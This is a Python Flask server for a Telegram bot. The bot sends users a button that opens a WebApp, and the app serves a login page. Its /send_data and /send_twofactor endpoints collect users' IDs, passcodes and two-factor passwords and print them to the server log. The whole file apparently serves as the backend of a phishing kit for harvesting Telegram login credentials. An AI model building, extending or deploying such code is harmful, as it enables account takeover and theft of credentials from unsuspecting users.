from flask import Flask, request, jsonify, render_template
import requests
import os

app = Flask(__name__)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# Get the current deployment URL from environment or use default
APP_URL = os.environ.get("APP_URL", "https://tgbot-gllp.onrender.com")

# === Setup webhook ===
@app.route("/setup_webhook")
def setup_webhook():
    """Setup the Telegram webhook - visit this URL once after deployment"""
    if not BOT_TOKEN:
        return jsonify({"error": "BOT_TOKEN not set"}), 500
    
    webhook_url = f"{APP_URL}/"
    response = requests.post(
        f"{TELEGRAM_API}/setWebhook",
        json={"url": webhook_url}
    )
    
    result = response.json()
    return jsonify({
        "webhook_url": webhook_url,
        "telegram_response": result
    })

@app.route("/webhook_info")
def webhook_info():
    """Check current webhook status"""
    if not BOT_TOKEN:
        return jsonify({"error": "BOT_TOKEN not set"}), 500
    
    response = requests.get(f"{TELEGRAM_API}/getWebhookInfo")
    return jsonify(response.json())

# === Telegram Webhook ===
# === Telegram Webhook ===
@app.route("/", methods=["POST"])
def webhook():
    update = request.get_json(force=True, silent=True)

    if not update or "message" not in update:
        return jsonify({"ok": True})

    message = update["message"]
    chat_id = message["chat"]["id"]
    text = message.get("text", "")

    # Handle /start command
    if text == "/start":
        webapp_url = f"{APP_URL}/webapp"

        # ✅ Inline keyboard with WebApp button
        keyboard = {
            "inline_keyboard": [[{
                "text": "🌐 Open WebApp",
                "web_app": {"url": webapp_url}
            }]]
        }

        # ✅ Send message with WebApp button
        payload = {
            "chat_id": chat_id,
            "text": (
                "👋 Welcome!\n\n"
                "Tap the button below to open the WebApp 👇"
            ),
            "reply_markup": keyboard
        }

        print(f"📤 Sending WebApp button with URL: {webapp_url}", flush=True)
        r = requests.post(f"{TELEGRAM_API}/sendMessage", json=payload)
        print("📩 Telegram API response:", r.text, flush=True)

    return jsonify({"ok": True})


# === WebApp UI ===
@app.route("/webapp")
def webapp():
    return render_template("index.html")

@app.route('/login')
def login_screen():
    return render_template('login.html')

# === Receive data from WebApp ===
@app.route("/send_data", methods=["POST"])
def send_data():
    data = request.get_json()
    
    # Print received data to console
    print("=" * 50, flush=True)
    print("📨 Received from webapp:", flush=True)
    print(f"   User ID: {data.get('user_id')}", flush=True)
    print(f"   Passcode: {data.get('passcode')}", flush=True)
    print(f"   Full data: {data}", flush=True)
    print("=" * 50, flush=True)

    return jsonify({"ok": True, "status": "received"})


# === Receive 2FA data from WebApp ===
@app.route("/send_twofactor", methods=["POST"])
def send_twofactor():
    data = request.get_json()
    
    # Print received data to console
    print("=" * 50, flush=True)
    print("🔐 Received 2FA from webapp:", flush=True)
    print(f"   User ID: {data.get('user_id')}", flush=True)
    print(f"   2FA Password: {data.get('twofactor')}", flush=True)
    print(f"   Full data: {data}", flush=True)
    print("=" * 50, flush=True)

    return jsonify({"ok": True, "status": "received"})


@app.route("/status")
def index():
    bot_status = "✅ BOT_TOKEN is set" if BOT_TOKEN else "❌ BOT_TOKEN not set"
    return f"""
    <h1>Telegram Bot Server Status</h1>
    <p>✅ Server is running</p>
    <p>{bot_status}</p>
    <p>📱 WebApp URL: {APP_URL}/webapp</p>
    <hr>
    <p><a href="/webhook_info">Check Webhook Status</a></p>
    <p><a href="/setup_webhook">Setup Webhook</a></p>
    """

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))